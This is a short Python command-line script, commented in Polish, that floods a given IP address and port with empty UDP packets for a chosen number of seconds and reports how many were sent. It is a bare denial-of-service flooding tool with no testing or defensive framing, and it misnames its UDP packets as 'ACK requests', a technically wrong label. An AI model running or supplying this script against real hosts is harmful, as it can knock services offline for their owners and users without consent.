import sys
import socket
import time

def send_ack_requests(ip, port, duration):
    # Tworzymy gniazdo UDP
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(1)  # Timeout na 1 sekundę

    end_time = time.time() + duration
    request_count = 0

    print(f"Sending ACK requests to {ip}:{port} for {duration} seconds...")

    while time.time() < end_time:
        try:
            # Wysyłamy pusty pakiet ACK
            s.sendto(b'', (ip, port))
            request_count += 1
        except socket.error as e:
            print(f"Error sending packet: {e}")
            continue

    print(f"Sent {request_count} ACK requests in total.")

    s.close()

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python ack.py <ip> <port> <time>")
        sys.exit(1)

    ip = sys.argv[1]
    port = int(sys.argv[2])
    duration = int(sys.argv[3])

    send_ack_requests(ip, port, duration)
